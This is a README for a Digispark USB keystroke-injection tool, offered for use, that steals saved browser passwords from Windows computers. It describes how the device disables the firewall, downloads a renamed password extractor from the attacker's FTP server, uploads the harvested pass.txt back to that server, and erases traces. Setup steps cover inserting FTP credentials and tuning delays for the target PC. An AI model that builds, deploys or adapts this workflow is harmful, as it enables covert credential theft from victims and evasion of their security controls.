# Digispark-DumpPassword
This is a simple script which can extract browser passwords from Windows Computer without leaving any traces. 
# Authors
- *punkjj* - **Pankaj Sheoran**
# What you need
 - **DigiSpark** Attiny85 USB Board
 - Platformio or Arduino IDE
 - Windows/Linux Host PC
 - Windows PC for Testing
 - Drivehq.com Free Account
# How it works
- It opens an elevated commandline using Windows Run
- Hides the CMD Window below taskbar
- Makes a directory to work on in C://
- Turns off Firewall
- Changes working directory to the newly made one
- Connects to a FTP and downloads the BDP.exe (**Password Extractor**)
- Closes FTP connection and exits ftp.exe
- opens BDP.exe
- Hides this GUI window below taskbar
- Presses CTRL+A and CTRL+S
- Saves pass.txt which contains all the passwords extracted from Browsers
- Connects back to FTP and uploads pass.txt
- Deletes all the files created by this program and removes all traces
 # How to setup
 - Place your DriveHQ username here
`printThis("USERNAME", 2000);`
 - Place your DriveHQ password here ` printThis("PASSWORD", 2000);`
 - Change delays according to Target PC.
 - Download [WebBrowserPassView](https://www.nirsoft.net/utils/web_browser_password.html)
 - Rename it to BDP.exe and place it in root folder of your FTP.
 - Flash digdump.cpp using your favourite IDE :grin:
 
 # Indicators
 - LED ON indicates that program is now **Executing**
 - BLINKING LED indicates that progam has **Ended**
 
 # License
 - This project is licensed under the GNU General Public License v3.0
 - See [LICENSE.md](LICENSE.md) for more details
 
 
 


  
    
